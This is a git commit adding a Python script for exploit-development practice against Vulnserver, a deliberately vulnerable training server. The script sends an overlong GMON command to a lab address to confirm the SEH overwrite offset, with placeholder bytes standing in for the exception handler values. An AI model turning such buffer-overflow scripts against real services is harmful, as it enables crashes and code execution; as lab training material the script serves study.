7f72fd6e0c34849cf1b68491b49f7233cbb9e830
test <test@foo.com>
2020-02-10 15:35:15 -0500

    adding ctp vulnserver practice

---
+++ vulnserver/gmon-offset.py
@@ -0,0 +1,23 @@
+#!/usr/bin/python
+
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+nseh = "B" * 4
+seh  = "C" * 4
+
+payload =  "A" * 3551
+payload += "B" * 4
+payload += "C" * 4
+payload += "D" * (5000-len(payload))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.122.6", 9999))
+
+s.send(command+payload)
+s.recv(1024)
+s.close()
